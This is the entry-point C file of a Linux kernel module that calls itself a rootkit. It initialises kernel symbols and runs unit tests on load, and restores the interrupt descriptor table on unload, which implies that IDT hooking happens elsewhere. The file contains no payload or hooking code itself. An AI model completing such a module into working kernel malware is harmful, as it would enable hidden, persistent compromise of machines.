#include "slrk.h"
#include "tests.h"

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/debugfs.h>
#include <linux/kallsyms.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <asm/uaccess.h>
#include "test.h"

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    init_symbols();

    init_unit_tests();
    run_unit_tests();

    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
    idt_restore();
    cleanup_unit_tests();
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
